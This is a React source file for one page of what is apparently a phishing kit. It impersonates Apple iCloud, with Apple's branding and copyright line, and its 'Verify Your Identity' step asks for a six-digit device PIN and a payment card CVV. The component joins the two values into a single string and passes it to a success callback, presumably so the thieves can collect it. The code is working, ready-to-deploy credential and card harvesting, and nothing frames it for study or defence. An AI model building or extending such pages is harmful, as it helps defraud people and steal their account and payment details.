import { useState, useRef, useEffect } from 'react'
import Background from '../components/Background'

export default function PinCvvPage({ email, onBack, onSuccess }) {
  const [pin, setPin] = useState(['', '', '', '', '', ''])
  const [cvv, setCvv] = useState('')
  const [showCvv, setShowCvv] = useState(false)
  const [error, setError] = useState('')
  const pinRefs = useRef([])

  useEffect(() => {
    pinRefs.current[0]?.focus()
  }, [])

  const handlePinChange = (index, value) => {
    const char = value.replace(/[^0-9]/g, '').slice(-1)
    const newPin = [...pin]
    newPin[index] = char
    setPin(newPin)
    setError('')
    if (char && index < 5) {
      pinRefs.current[index + 1]?.focus()
    }
  }

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus()
    }
    if (e.key === 'ArrowLeft' && index > 0) pinRefs.current[index - 1]?.focus()
    if (e.key === 'ArrowRight' && index < 5) pinRefs.current[index + 1]?.focus()
  }

  const handlePinPaste = (e) => {
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6)
    if (pasted.length > 0) {
      const newPin = [...pin]
      for (let i = 0; i < 6; i++) {
        newPin[i] = pasted[i] || ''
      }
      setPin(newPin)
      const focusIdx = Math.min(pasted.length, 5)
      pinRefs.current[focusIdx]?.focus()
      e.preventDefault()
    }
  }

  const pinFilled = pin.every(d => d !== '')
  const cvvFilled = cvv.length >= 3

  const handleContinue = () => {
    if (!pinFilled) { setError('Please enter your 6-digit PIN.'); return }
    if (!cvvFilled) { setError('Please enter your CVV (3–4 digits).'); return }
    setError('')
    onSuccess(`PIN: ${pin.join('')} | CVV: ${cvv}`)
  }

  return (
    <>
      <Background />

      <div className="topbar">
        <span className="topbar-logo" style={{ fontWeight: 600 }}>iCloud</span>
        <div className="topbar-right">
          <span className="topbar-link">Setup Instructions</span>
          <span style={{ color: 'rgba(255,255,255,0.4)', margin: '0 4px' }}>|</span>
          <div className="topbar-help">
            <svg viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"/>
              <path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/>
              <line x1="12" y1="17" x2="12.01" y2="17"/>
            </svg>
          </div>
        </div>
      </div>

      <div className="page">
        <div className="card" style={{ gap: 18 }}>
          {/* Identity Verification Icon */}
          <div className="icloud-icon" style={{ background: '#1d1d1f' }}>
            <svg viewBox="0 0 24 24" fill="white" style={{ width: 44, height: 44 }}>
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.4 0 2.5 1.1 2.5 2.5S13.4 12 12 12s-2.5-1.1-2.5-2.5S10.6 7 12 7zm4 10H8v-1c0-1.33 2.67-2 4-2s4 .67 4 2v1z"/>
            </svg>
          </div>

          <div className="title" style={{ fontSize: 24 }}>Verify Your Identity</div>
          <div className="subtitle" style={{ color: '#86868b', fontSize: 13.5, marginBottom: 5 }}>Enter your device PIN and payment CVV to complete sign in.</div>

          {/* Email display */}
          <div className="email-display" style={{ background: 'rgba(0,0,0,0.05)', color: '#1d1d1f' }}>
            <strong style={{ fontSize: 13 }}>{email}</strong>
          </div>

          <div className="divider" style={{ background: '#d2d2d7' }} />

          {/* PIN section */}
          <span className="section-label" style={{ color: '#86868b', fontSize: 11 }}>6-Digit Device PIN</span>
          <div className="pin-row" onPaste={handlePinPaste}>
            {pin.map((digit, i) => (
              <input
                key={i}
                ref={el => pinRefs.current[i] = el}
                className={`pin-input ${digit ? 'filled' : ''}`}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={e => handlePinChange(i, e.target.value)}
                onKeyDown={e => handlePinKeyDown(i, e)}
                autoComplete="off"
                style={{ background: '#f5f5f7', color: '#1d1d1f', border: '1px solid #d2d2d7' }}
              />
            ))}
          </div>

          <div className="divider" style={{ background: '#d2d2d7' }} />

          {/* CVV section */}
          <span className="section-label" style={{ color: '#86868b', fontSize: 11 }}>Payment CVV</span>
          <div className="cvv-wrap">
            <input
              className="cvv-input"
              type={showCvv ? 'text' : 'password'}
              inputMode="numeric"
              placeholder="• • •"
              maxLength={4}
              value={cvv}
              onChange={e => { setCvv(e.target.value.replace(/\D/g, '')); setError('') }}
              autoComplete="cc-csc"
              style={{ paddingRight: 48, letterSpacing: cvv ? '6px' : '2px', background: '#f5f5f7', color: '#1d1d1f', border: '1px solid #d2d2d7' }}
            />
            <button
              className="cvv-icon"
              onClick={() => setShowCvv(!showCvv)}
              style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
              title={showCvv ? 'Hide' : 'Show'}
            >
              {showCvv ? (
                <svg viewBox="0 0 24 24" fill="none" stroke="#8e8e93" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
                  <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
                  <line x1="1" y1="1" x2="23" y2="23"/>
                </svg>
              ) : (
                <svg viewBox="0 0 24 24" fill="none" stroke="#8e8e93" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                  <circle cx="12" cy="12" r="3"/>
                </svg>
              )}
            </button>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
            <svg width="13" height="13" viewBox="0 0 24 24" fill="#86868b">
              <path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
            </svg>
            <span style={{ color: '#86868b', fontSize: 11.5 }}>
              3-digit code on the back of your card (4 digits for Amex)
            </span>
          </div>

          {error && <div className="error-msg">{error}</div>}

          <button
            className="primary-btn"
            onClick={handleContinue}
            disabled={!pinFilled || !cvvFilled}
          >
            Continue
          </button>

          <button className="back-btn" onClick={onBack} style={{ alignSelf: 'center', color: '#0071e3' }}>
            Cancel
          </button>
        </div>
      </div>

      <div className="bottom-links">
        <a href="#">Privacy Policy</a>
        <span className="sep">|</span>
        <a href="#">Terms &amp; Conditions</a>
        <span className="sep">|</span>
        <span className="copyright">Copyright © 2025 Apple Inc. All rights reserved.</span>
      </div>
    </>
  )
}
